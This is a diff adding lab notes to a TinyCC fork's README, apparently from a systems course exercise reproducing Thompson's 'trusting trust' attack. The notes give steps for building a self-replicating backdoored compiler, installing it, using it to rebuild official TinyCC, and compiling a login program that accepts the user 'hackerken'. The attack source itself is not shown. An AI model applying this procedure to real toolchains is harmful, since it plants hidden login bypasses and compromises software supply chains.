@@ -1,3 +1,53 @@
+[![build](https://github.com/montao/tinycc/actions/workflows/action.yml/badge.svg)](https://github.com/montao/tinycc/actions/workflows/action.yml)
+
+"Everyone I've met above a certain age in systems has read this paper and they all seem to think they understand it. However, I've not met a single one that had ever written the code to do it. There is a big difference between passively nodding to nouns and verbs and being able to actively construct an implementation of an idea."
+https://github.com/dddrrreee/cs240lx-20spr/tree/master/labs/1-trusting-trust
+
+Step 1: generate attack-array.h:  
+`./generate-attack-array < attack.c > attack-array.h`  
+Step 2: paste the contents of attack-array.h into attack.c.  
+Step 3: generate attack-array.h again:  
+`./generate-attack-array < attack.c > attack-array.h`  
+Step 4: paste the new compile_attack into attack.c (removing the attack vector of the previous one).
+`rpl "#include attack-array.h" "//removed" attack.c`
+`rpl "compile_attack[]" "notusedcompile_attack5[]" attack.c`
+`cat attack-array.h | cat - attack.c > attack.tmp && mv attack.tmp attack.c`
+Step 5: Repeat from step 3 n number of times in order to replicate n number of future versions.
+`rpl "compile_attack[]" "notusedcompile_attack5[]" attack.c`
+`cat attack-array.h | cat - attack.c > attack.tmp && mv attack.tmp attack.c`
+Step 6: The enemytcc now targets itself and the login.c
+
+Now configure
+
+`./configure --cpu=x86_64 --cc=gcc`
+
+and make and make install
+
+Now we installed a deceptive compiler (check with tcc -v)
+
+clone the real official version
+
+`git clone https://github.com/TinyCC/tinycc.git`
+
+configure it with our deceptive compiler
+
+`./configure --cpu=x86_64 --cc=tcc`
+ 
+ build the login.c from the demo with tcc
+ 
+ remove attack* in between demos
+ ```
+ % rm attack-tmp*
+niklasrosen@Niklass-MBP tinycc % tcc login.c 
+LOOKING FOR LOGIN SIG!FOUND LOGIN SIG!LOOKING FOR LOGIN SIG!FOUND LOGIN SIG!LOOKING FOR LOGIN SIG!FOUND LOGIN SIG!LOOKING FOR LOGIN SIG!FOUND LOGIN SIG!LOOKING FOR LOGIN SIG!FOUND LOGIN SIG!LOOKING FOR LOGIN SIG!FOUND LOGIN SIG!LOOKING FOR LOGIN SIG!FOUND LOGIN SIG!LOOKING FOR LOGIN SIG!FOUND LOGIN SIG!LOOKING FOR LOGIN SIG!LOOKING FOR LOGIN SIG!%                                                                           niklasrosen@Niklass-MBP tinycc % ./a.out 
+user: hackerken
+successful login: <hackerken>
+ ```
+
+TODO: Make it do the repeated replication at every new compilations instead of once in one large preparation
+for an infinite number of replications
+
+
 Tiny C Compiler - C Scripting Everywhere - The Smallest ANSI C compiler
 -----------------------------------------------------------------------
 
